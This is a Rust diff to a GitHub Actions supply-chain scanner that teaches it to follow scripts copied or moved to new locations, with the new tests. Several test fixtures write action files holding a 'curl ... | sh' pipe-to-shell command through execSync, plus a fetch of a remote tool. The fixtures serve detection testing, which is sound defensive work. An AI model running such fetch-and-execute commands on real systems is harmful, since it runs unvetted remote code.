@@ -774,7 +774,7 @@ fn mentions_action_path(value: &str) -> bool {
         || value.contains("$PSScriptRoot")
 }
 
-fn executable_source_kind(path: &str) -> Option<SourceFileKind> {
+pub(crate) fn executable_source_kind(path: &str) -> Option<SourceFileKind> {
     if is_javascript_source(path) {
         Some(SourceFileKind::JavaScript)
     } else if path.ends_with(".py") {
@@ -1069,6 +1069,7 @@ fn force_include_remote_source_dependencies(
         targets,
         contents,
         &mut HashMap::new(),
+        &mut HashSet::new(),
     )
 }
 
@@ -1082,6 +1083,7 @@ fn follow_source_dependencies(
     targets: &mut Vec<(String, SourceFileKind)>,
     contents: &[Option<Result<String>>],
     contexts: &mut HashMap<String, LocatedDirectory>,
+    relocated: &mut HashSet<String>,
 ) -> bool {
     let available: HashSet<&str> = tree
         .iter()
@@ -1126,6 +1128,9 @@ fn follow_source_dependencies(
                 let code = strip_javascript_comments(&content);
                 let quotes = crate::audit::JavaScriptQuoteIndex::new(&code);
                 for captures in JS_LOCAL_DEPENDENCY_RE.captures_iter(&code) {
+                    if relocated.contains(&path) {
+                        complete = false;
+                    }
                     let Some(dependency) = captures.name("path") else {
                         complete = false;
                         continue;
@@ -1151,6 +1156,9 @@ fn follow_source_dependencies(
                     let argument = argument.as_str().trim();
                     if let Some(dependency) = exact_javascript_loader_specifier(argument) {
                         if dependency.starts_with("./") || dependency.starts_with("../") {
+                            if relocated.contains(&path) {
+                                complete = false;
+                            }
                             complete &= include_remote_javascript_dependency(
                                 &available, targets, &path, dependency,
                             );
@@ -1171,6 +1179,9 @@ fn follow_source_dependencies(
                         let argument = argument.as_str().trim();
                         if let Some(dependency) = exact_javascript_loader_specifier(argument) {
                             if dependency.starts_with("./") || dependency.starts_with("../") {
+                                if relocated.contains(&path) {
+                                    complete = false;
+                                }
                                 complete &= include_remote_javascript_dependency(
                                     &available, targets, &path, dependency,
                                 );
@@ -1180,13 +1191,17 @@ fn follow_source_dependencies(
                         }
                     }
                 }
-                for execution in
+                for mut execution in
                     crate::audit_javascript::located_executions(&path, &content, &context)
                 {
+                    if relocated.contains(&path) {
+                        execution.unbind_self_location();
+                    }
                     complete &= include_located_execution(
                         &available,
                         targets,
                         contexts,
+                        relocated,
                         &path,
                         action_base,
                         &execution,
@@ -1206,11 +1221,15 @@ fn follow_source_dependencies(
                     .into_iter()
                     .collect();
                 let (executions, loaded_modules) = python_located_executions(&content, &context);
-                for execution in executions {
+                for mut execution in executions {
+                    if relocated.contains(&path) {
+                        execution.unbind_self_location();
+                    }
                     complete &= include_located_execution(
                         &available,
                         targets,
                         contexts,
+                        relocated,
                         &path,
                         action_base,
                         &execution,
@@ -1228,6 +1247,9 @@ fn follow_source_dependencies(
                         &module,
                         &python_roots,
                     );
+                    if relocated.contains(&path) && found {
+                        complete = false;
+                    }
                     if !tree_complete && !found {
                         complete = false;
                     }
@@ -1251,6 +1273,9 @@ fn follow_source_dependencies(
                             module,
                             &python_roots,
                         );
+                        if relocated.contains(&path) && found {
+                            complete = false;
+                        }
                         if (!tree_complete || module.starts_with('.')) && !found {
                             complete = false;
                         }
@@ -1281,19 +1306,26 @@ fn follow_source_dependencies(
                 }
             }
             SourceFileKind::Shell => {
-                for execution in
+                for mut execution in
                     shell_located_executions(&content, path.ends_with(".ps1"), context.directory)
                 {
+                    if relocated.contains(&path) {
+                        execution.unbind_self_location();
+                    }
                     complete &= include_located_execution(
                         &available,
                         targets,
                         contexts,
+                        relocated,
                         &path,
                         action_base,
                         &execution,
                     );
                 }
                 for captures in SHELL_LOCAL_SOURCE_RE.captures_iter(&content) {
+                    if relocated.contains(&path) {
+                        complete = false;
+                    }
                     let Some(dependency) = captures.name("path") else {
                         complete = false;
                         continue;
@@ -1337,6 +1369,7 @@ fn follow_source_dependencies(
                         &available,
                         targets,
                         contexts,
+                        relocated,
                         &path,
                         action_base,
                         &execution,
@@ -1361,15 +1394,17 @@ pub(crate) struct LocatedExecution {
     kind: SourceFileKind,
     optional: bool,
     directory: Option<LocatedDirectory>,
+    relocated: bool,
 }
 
 impl LocatedExecution {
-    fn of(value: &str, kind: SourceFileKind) -> Self {
+    pub(crate) fn of(value: &str, kind: SourceFileKind) -> Self {
         Self {
             path: bound_location(value).map(str::to_string),
             kind,
             optional: false,
             directory: None,
+            relocated: false,
         }
     }
 
@@ -1379,6 +1414,30 @@ impl LocatedExecution {
             kind,
             optional: false,
             directory: None,
+            relocated: false,
+        }
+    }
+
+    pub(crate) fn copied(value: &str, kind: SourceFileKind) -> Self {
+        Self {
+            relocated: true,
+            ..Self::of(value, kind)
+        }
+    }
+
+    fn unbind_self_location(&mut self) {
+        if self
+            .path
+            .as_deref()
+            .is_some_and(|path| path.contains(SELF_LOCATION))
+        {
+            self.path = None;
+            self.optional = false;
+        }
+        if self.directory.as_ref().is_some_and(
+            |directory| matches!(directory, LocatedDirectory::Located(path) if path.contains(SELF_LOCATION)),
+        ) {
+            self.directory = Some(LocatedDirectory::Unresolved);
         }
     }
 }
@@ -1547,6 +1606,7 @@ fn include_located_execution(
     available: &HashSet<&str>,
     targets: &mut Vec<(String, SourceFileKind)>,
     contexts: &mut HashMap<String, LocatedDirectory>,
+    relocated: &mut HashSet<String>,
     source: &str,
     action_base: &str,
     execution: &LocatedExecution,
@@ -1560,6 +1620,9 @@ fn include_located_execution(
     };
     if !available.contains(path.as_str()) {
         return execution.optional;
+    }
+    if execution.relocated {
+        relocated.insert(path.clone());
     }
     let directory = execution
         .directory
@@ -1969,7 +2032,7 @@ fn copied_located_files(
     for operand in operands.iter().filter(|word| is_location_derived(word)) {
         match bound_location(operand) {
             Some(path) if executable_source_kind(path).is_some() => {
-                executions.push(LocatedExecution::of(path, direct_execution_kind(path)));
+                executions.push(LocatedExecution::copied(path, direct_execution_kind(path)));
             }
             Some(path) if is_copied_data_path(path) => {}
             _ => executions.push(LocatedExecution::unresolved(SourceFileKind::Shell)),
@@ -1979,7 +2042,7 @@ fn copied_located_files(
 
 /// Structured data a copy cannot turn into a script. Plain text is not
 /// included: renaming it is how a script hides.
-fn is_copied_data_path(path: &str) -> bool {
+pub(crate) fn is_copied_data_path(path: &str) -> bool {
     is_nonexecutable_data_path(path)
         && !Path::new(path)
             .extension()
@@ -2027,6 +2090,7 @@ fn module_execution(
                 kind: SourceFileKind::Python,
                 optional: true,
                 directory: None,
+                relocated: false,
             }),
             LocatedDirectory::Unresolved => {
                 executions.push(LocatedExecution::unresolved(SourceFileKind::Python));
@@ -4778,6 +4842,7 @@ fn force_include_local_source_dependencies(
     available: &[PathBuf],
     targets: &mut Vec<(PathBuf, SourceFileKind)>,
     contexts: &mut HashMap<String, LocatedDirectory>,
+    relocated: &mut HashSet<String>,
 ) -> bool {
     let Some(action_base) = action_dir
         .strip_prefix(repo_root)
@@ -4826,6 +4891,7 @@ fn force_include_local_source_dependencies(
         &mut string_targets,
         &contents,
         contexts,
+        relocated,
     );
     for (relative, kind) in string_targets.into_iter().skip(before) {
         let path = repo_root.join(&relative);
@@ -4888,6 +4954,7 @@ pub(crate) fn scan_local_action_source_graph(
     let (mut targets, mut available, mut complete) = collect_local_source_files(&action_dir)?;
     let initial_len = targets.len();
     let mut contexts = HashMap::new();
+    let mut relocated = HashSet::new();
     complete &=
         force_include_local_action_entrypoints(repo_root, &action_dir, &mut targets, &mut contexts);
     if cap_targets_prioritizing_entrypoints(&mut targets, initial_len).is_some() {
@@ -4901,18 +4968,20 @@ pub(crate) fn scan_local_action_source_graph(
     loop {
         let before = targets.len();
         let known = contexts.clone();
+        let known_relocated = relocated.clone();
         complete &= force_include_local_source_dependencies(
             repo_root,
             &action_dir,
             &available,
             &mut targets,
             &mut contexts,
+            &mut relocated,
         );
         if targets.len() > MAX_SOURCE_FILES {
             targets.truncate(MAX_SOURCE_FILES);
             complete = false;
         }
-        if targets.len() == before && contexts == known {
+        if targets.len() == before && contexts == known && relocated == known_relocated {
             break;
         }
     }
@@ -5102,6 +5171,7 @@ async fn scan_one_action_source(
     let mut action_bytes = initial_bytes;
     let mut initial_len = targets.len();
     let mut contexts = HashMap::new();
+    let mut relocated = HashSet::new();
     complete &= force_include_remote_action_entrypoints(
         &tree.entries,
         &mut targets,
@@ -5132,6 +5202,7 @@ async fn scan_one_action_source(
     loop {
         let fetched_len = targets.len();
         let known = contexts.clone();
+        let known_relocated = relocated.clone();
         complete &= follow_source_dependencies(
             &tree.entries,
             !tree.truncated,
@@ -5139,9 +5210,10 @@ async fn scan_one_action_source(
             &mut targets,
             &contents,
             &mut contexts,
+            &mut relocated,
         );
         if targets.len() == fetched_len {
-            if contexts == known {
+            if contexts == known && relocated == known_relocated {
                 break;
             }
             continue;
@@ -6488,6 +6560,7 @@ mod tests {
                 &mut targets,
                 &contents,
                 &mut contexts,
+                &mut HashSet::new(),
             ));
             while contents.len() < targets.len() {
                 contents.push(Some(Ok(match targets[contents.len()].0.as_str() {
@@ -7098,6 +7171,7 @@ mod tests {
                     &mut targets,
                     &contents,
                     &mut HashMap::new(),
+                    &mut HashSet::new(),
                 ),
                 complete,
                 "{bridge}"
@@ -7132,6 +7206,7 @@ mod tests {
                     &mut targets,
                     &contents,
                     &mut HashMap::new(),
+                    &mut HashSet::new(),
                 ),
                 complete,
                 "{bridge}"
@@ -7320,6 +7395,193 @@ mod tests {
         ] {
             assert!(!follow(&tree, "action/index.js", source).0, "{source}");
         }
+    }
+
+    #[test]
+    fn javascript_copied_sources_resolve_or_fail_closed() {
+        let tree = ["action/index.js", "action/index1.js", "action/config.json"];
+        for source in [
+            "io_cp(__dirname + '/index1.js', '/opt/tofu');",
+            "const duplicate = io_cp; duplicate(__dirname + '/index1.js', '/opt/tofu');",
+            "fs.copyFileSync(__dirname + '/index1.js', '/opt/tofu');",
+            "fs.cpSync(__dirname + '/index1.js', '/opt/tofu');",
+            "const duplicate = fs.copyFileSync; duplicate(__dirname + '/index1.js', '/opt/tofu');",
+            "fs.writeFileSync('/opt/tofu', fs.readFileSync(__dirname + '/index1.js'), { mode: 0o755 });",
+            "fs.createReadStream(__dirname + '/index1.js').pipe(fs.createWriteStream('/opt/tofu', { mode: 0o755 }));",
+        ] {
+            assert_eq!(
+                follow(&tree, "action/index.js", source),
+                (true, vec!["action/index1.js".to_string()]),
+                "{source}"
+            );
+        }
+        assert_eq!(
+            follow(
+                &tree,
+                "action/index.js",
+                "io_cp(__dirname + '/config.json', '/opt/config.json');"
+            ),
+            (true, vec![])
+        );
+        assert!(
+            !follow(
+                &tree,
+                "action/index.js",
+                "io_cp(__dirname + '/' + name, '/opt/tofu');"
+            )
+            .0
+        );
+        assert_eq!(
+            follow(
+                &tree,
+                "action/index.js",
+                r#"function __nccwpck_require__() {}
+__nccwpck_require__.ab = new URL('.', import.meta.url).pathname.slice(import.meta.url.match(/^file:\/\/\/\w:/) ? 1 : 0, -1) + '/';
+io_cp(__nccwpck_require__.ab + 'index1.js', '/opt/tofu');"#
+            ),
+            (false, vec!["action/index1.js".to_string()])
+        );
+    }
+
+    #[test]
+    fn javascript_buffer_copy_is_not_a_file_copy() {
+        let tree = ["action/index.js", "action/archive.zip"];
+        assert!(
+            follow(
+                &tree,
+                "action/index.js",
+                "const chunk = fs.readFileSync(__dirname + '/archive.zip'); chunk.copy(chunk);"
+            )
+            .0
+        );
+    }
+
+    #[test]
+    fn javascript_module_copy_calls_follow_action_sources() {
+        let tree = ["action/index.js", "action/w.js"];
+        for source in [
+            "const io = require('fs-extra'); io.copy(__dirname + '/w.js', '/opt/tool');",
+            "const { copy: duplicate } = require('fs-extra'); duplicate(__dirname + '/w.js', '/opt/tool');",
+            "import { copy as duplicate } from 'fs-extra'; duplicate(__dirname + '/w.js', '/opt/tool');",
+            "import * as io from 'fs-extra'; io.copy(__dirname + '/w.js', '/opt/tool');",
+            "const io = __nccwpck_require__(13); io.copy(__dirname + '/w.js', '/opt/tool');",
+            "const io = require('fs-extra'); const duplicate = io.copy; duplicate(__dirname + '/w.js', '/opt/tool');",
+            "const io = require('fs-extra'); io.moveSync(__dirname + '/w.js', '/opt/tool');",
+            "const { moveSync: duplicate } = require('fs-extra'); duplicate(__dirname + '/w.js', '/opt/tool');",
+        ] {
+            assert_eq!(
+                follow(&tree, "action/index.js", source),
+                (true, vec!["action/w.js".to_string()]),
+                "{source}"
+            );
+        }
+        assert_eq!(
+            follow(
+                &tree,
+                "action/index.js",
+                "const helper = { copy() {} }; helper.copy(__dirname + '/w.js', '/opt/tool');"
+            ),
+            (true, vec![])
+        );
+    }
+
+    #[test]
+    fn copied_sources_only_lose_coverage_when_their_new_location_matters() {
+        for (entry, copied, kind, copier, harmless, relative_execution) in [
+            (
+                "action/index.js",
+                "action/w.js",
+                SourceFileKind::JavaScript,
+                "fs.copyFileSync(__dirname + '/w.js', '/usr/local/bin/tool');",
+                "console.log('ready');",
+                "execFileSync('bash', [__dirname + '/install.sh']);",
+            ),
+            (
+                "action/main.sh",
+                "action/w.sh",
+                SourceFileKind::Shell,
+                "cp \"$GITHUB_ACTION_PATH/w.sh\" /usr/local/bin/tool",
+                "echo ready",
+                "bash \"$(dirname \"$0\")/install.sh\"",
+            ),
+        ] {
+            for (source, expected) in [(harmless, true), (relative_execution, false)] {
+                let tree: Vec<_> = [entry, copied, "action/install.sh"]
+                    .iter()
+                    .map(|path| tree_entry(path, "blob"))
+                    .collect();
+                let mut targets = vec![(entry.to_string(), kind)];
+                let mut contents = vec![Some(Ok(copier.to_string()))];
+                let mut contexts = HashMap::new();
+                let mut relocated = HashSet::new();
+                let mut complete = true;
+                loop {
+                    let before = (targets.len(), contexts.clone(), relocated.clone());
+                    complete &= follow_source_dependencies(
+                        &tree,
+                        true,
+                        "action",
+                        &mut targets,
+                        &contents,
+                        &mut contexts,
+                        &mut relocated,
+                    );
+                    while contents.len() < targets.len() {
+                        contents.push(Some(Ok(source.to_string())));
+                    }
+                    if before == (targets.len(), contexts.clone(), relocated.clone()) {
+                        break;
+                    }
+                }
+                assert_eq!(complete, expected, "{entry}: {source}");
+                assert!(targets.iter().any(|(path, _)| path == copied));
+            }
+        }
+    }
+
+    #[test]
+    fn copied_shell_module_lookup_cannot_keep_complete_coverage() {
+        let tree: Vec<_> = [
+            "action/main.sh",
+            "action/w.sh",
+            "action/w2.sh",
+            "action/helper.py",
+        ]
+        .iter()
+        .map(|path| tree_entry(path, "blob"))
+        .collect();
+        let mut targets = vec![("action/main.sh".to_string(), SourceFileKind::Shell)];
+        let mut contents = vec![Some(Ok(
+            "cp \"$GITHUB_ACTION_PATH/w.sh\" \"$GITHUB_ACTION_PATH/w2.sh\"\nbash \"$GITHUB_ACTION_PATH/w2.sh\"".to_string(),
+        ))];
+        let mut contexts = HashMap::new();
+        let mut relocated = HashSet::new();
+        let mut complete = true;
+        loop {
+            let before = (targets.len(), contexts.clone(), relocated.clone());
+            complete &= follow_source_dependencies(
+                &tree,
+                true,
+                "action",
+                &mut targets,
+                &contents,
+                &mut contexts,
+                &mut relocated,
+            );
+            while contents.len() < targets.len() {
+                let source = match targets[contents.len()].0.as_str() {
+                    "action/w.sh" => "cd \"$(dirname \"$0\")\"; python3 -m helper",
+                    "action/w2.sh" => "echo ready",
+                    "action/helper.py" => "fetch('https://example.com/latest/tool')",
+                    path => panic!("unexpected target: {path}"),
+                };
+                contents.push(Some(Ok(source.to_string())));
+            }
+            if before == (targets.len(), contexts.clone(), relocated.clone()) {
+                break;
+            }
+        }
+        assert!(!complete, "relocated module lookup must be unresolved");
     }
 
     #[test]
@@ -8476,6 +8738,130 @@ runs:
             scan_local_action_source(dir.path(), &action, &mut collector, &DEFAULT_CONFIG).unwrap();
 
         assert_eq!(status, ActionScanStatus::Complete);
+    }
+
+    #[test]
+    fn scan_local_action_source_follows_copied_javascript_wrapper() {
+        let dir = tempfile::TempDir::new().unwrap();
+        let action_dir = dir.path().join(".github/actions/local");
+        std::fs::create_dir_all(action_dir.join("dist")).unwrap();
+        std::fs::write(
+            action_dir.join("action.yml"),
+            "runs:\n  using: node20\n  main: dist/index.js\n",
+        )
+        .unwrap();
+        std::fs::write(
+            action_dir.join("dist/index.js"),
+            "function __nccwpck_require__() {}\n__nccwpck_require__.ab = __dirname + '/';\nio_cp(__nccwpck_require__.ab + 'index1.js', '/opt/tofu');\n",
+        )
+        .unwrap();
+        std::fs::write(
+            action_dir.join("dist/index1.js"),
+            "fetch('https://example.com/latest/tool');\n",
+        )
+        .unwrap();
+
+        let action = LocalActionRef {
+            path: "./.github/actions/local".to_string(),
+            line_number: 1,
+        };
+        let mut collector = AuditCollector::new(false);
+        let status =
+            scan_local_action_source(dir.path(), &action, &mut collector, &DEFAULT_CONFIG).unwrap();
+
+        assert_eq!(status, ActionScanStatus::Complete);
+        assert!(
+            collector
+                .findings
+                .iter()
+                .any(|finding| finding.source_file.ends_with("(dist/index1.js)"))
+        );
+    }
+
+    #[test]
+    fn scan_local_action_source_follows_javascript_read_write_copies() {
+        let dir = tempfile::TempDir::new().unwrap();
+        let action_dir = dir.path().join("action");
+        std::fs::create_dir_all(&action_dir).unwrap();
+        std::fs::write(
+            action_dir.join("action.yml"),
+            "runs:\n  using: node20\n  main: index.js\n",
+        )
+        .unwrap();
+        std::fs::write(
+            action_dir.join("w.js"),
+            "execSync('curl -fsSL https://example.com/latest/i.sh | sh');\n",
+        )
+        .unwrap();
+        let action = LocalActionRef {
+            path: "./action".to_string(),
+            line_number: 1,
+        };
+        for source in [
+            "fs.writeFileSync('/usr/local/bin/tool', fs.readFileSync(__dirname + '/w.js'), { mode: 0o755 });",
+            "fs.createReadStream(__dirname + '/w.js').pipe(fs.createWriteStream('/usr/local/bin/tool', { mode: 0o755 }));",
+        ] {
+            std::fs::write(action_dir.join("index.js"), source).unwrap();
+            let mut collector = AuditCollector::new(false);
+            let status =
+                scan_local_action_source(dir.path(), &action, &mut collector, &DEFAULT_CONFIG)
+                    .unwrap();
+            assert_eq!(status, ActionScanStatus::Complete, "{source}");
+            assert!(
+                collector
+                    .findings
+                    .iter()
+                    .any(|finding| finding.source_file.ends_with("(w.js)")),
+                "{source}"
+            );
+        }
+    }
+
+    #[test]
+    fn scan_local_action_source_follows_module_copies_with_committed_dependency() {
+        let dir = tempfile::TempDir::new().unwrap();
+        let action_dir = dir.path().join("action");
+        let module_dir = action_dir.join("node_modules/fs-extra");
+        std::fs::create_dir_all(&module_dir).unwrap();
+        std::fs::write(
+            action_dir.join("action.yml"),
+            "runs:\n  using: node20\n  main: index.js\n",
+        )
+        .unwrap();
+        std::fs::write(
+            action_dir.join("w.js"),
+            "execSync('curl -fsSL https://example.com/latest/i.sh | sh');\n",
+        )
+        .unwrap();
+        std::fs::write(
+            module_dir.join("package.json"),
+            "{\"name\":\"fs-extra\",\"main\":\"index.js\"}\n",
+        )
+        .unwrap();
+        std::fs::write(module_dir.join("index.js"), "module.exports = {};\n").unwrap();
+        let action = LocalActionRef {
+            path: "./action".to_string(),
+            line_number: 1,
+        };
+        for source in [
+            "const io = require('fs-extra'); io.copy(__dirname + '/w.js', '/usr/local/bin/tool');",
+            "const { copy } = require('fs-extra'); copy(__dirname + '/w.js', '/usr/local/bin/tool');",
+            "const io = require('fs-extra'); io.moveSync(__dirname + '/w.js', '/usr/local/bin/tool');",
+        ] {
+            std::fs::write(action_dir.join("index.js"), source).unwrap();
+            let mut collector = AuditCollector::new(false);
+            let status =
+                scan_local_action_source(dir.path(), &action, &mut collector, &DEFAULT_CONFIG)
+                    .unwrap();
+            assert_eq!(status, ActionScanStatus::Complete, "{source}");
+            assert!(
+                collector
+                    .findings
+                    .iter()
+                    .any(|finding| finding.source_file.ends_with("(w.js)")),
+                "{source}"
+            );
+        }
     }
 
     #[test]
